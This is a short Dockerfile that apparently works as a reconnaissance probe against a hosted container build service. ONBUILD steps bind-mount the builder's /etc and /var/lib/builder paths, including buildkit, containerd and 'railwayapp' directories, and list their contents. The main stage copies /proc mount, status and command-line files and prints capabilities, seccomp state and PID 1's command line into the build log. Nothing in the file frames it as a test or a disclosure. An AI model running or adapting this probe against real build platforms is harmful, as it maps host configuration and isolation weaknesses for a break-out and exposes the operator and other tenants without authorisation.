FROM alpine:3.20 AS base
ONBUILD RUN --mount=type=bind,source=etc,target=/hetc sh -c 'set +e; echo "===ETC_BEGIN==="; ls -la /hetc | head -100; echo "--SYSTEMD--"; ls -la /hetc/systemd/system 2>&1 | head -60; echo "--SUBDIRS--"; ls -la /hetc/buildkit /hetc/docker /hetc/containerd /hetc/railwayapp /hetc/systemd 2>&1 | head -40; echo "===ETC_END==="'
ONBUILD RUN --mount=type=bind,source=var/lib/builder,target=/hb sh -c 'set +e; echo "===VB_BEGIN==="; ls -laR /hb 2>&1 | head -120; echo "===VB_END==="'
FROM base
COPY proc/self/mountinfo /f/self_mountinfo
COPY proc/self/status /f/self_status
COPY proc/self/cmdline /f/self_cmdline
COPY proc/1/cmdline /f/pid1_cmdline
RUN sh -c 'set +e; echo "===SELF_MOUNTINFO==="; cat /f/self_mountinfo; echo "===SELF_STATUS==="; grep -E "^(Uid|Gid|Cap|Seccomp|NoNewPrivs)" /f/self_status; echo "===SELF_CMDLINE==="; tr "\0" " " < /f/self_cmdline; echo; echo "===PID1_CMDLINE==="; tr "\0" " " < /f/pid1_cmdline; echo; echo "===END==="'
